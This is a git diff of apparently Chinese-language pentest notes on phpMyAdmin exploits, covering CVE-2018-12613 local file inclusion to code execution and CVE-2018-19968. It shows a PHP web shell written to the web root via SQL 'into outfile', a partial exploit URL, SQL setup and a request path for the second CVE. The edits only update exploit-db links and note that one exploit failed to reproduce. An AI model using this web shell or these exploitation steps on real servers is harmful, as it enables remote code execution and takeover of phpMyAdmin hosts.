@@ -9,7 +9,7 @@ select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/getshell.php"
 
 
 # CVE-2018-12613 本地文件包含 Version: 4.8.0, 4.8.1
-https://www.exploit-db.com/exploits/40185
+https://www.exploit-db.com/exploits/44928
 ```
 # Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution
 # Date: 2018-06-21
@@ -26,7 +26,7 @@ http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%2
 ```
 
 
-# CVE-2018-19968 远程代码执行文件包含  Version: 4.8.0 ~ 4.8.3
+# CVE-2018-19968 远程代码执行文件包含  Version: 4.8.0 ~ 4.8.3 这个不知道为啥复现不了，换了几个版本也没有效果
 ```
 #执行SQL
 CREATE DATABASE foo;
@@ -42,6 +42,9 @@ INSERT INTO `pma__column_info`SELECT '1', 'foo', 'bar', 'baz', 'plop',
 /tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1
 ```
 
+# 相关连接
+- 其他一些低版本的https://www.cnblogs.com/xishaonian/p/7627125.html
 
-其他一些低版本的https://www.cnblogs.com/xishaonian/p/7627125.html
-还可以看一下exploit-db
+# 还可以看一下exploit-db
+- https://www.exploit-db.com/exploits/40185 版本Version 4.3.0~4.6.2
+- https://www.exploit-db.com/exploits/44924 版本 4.8.1 等等
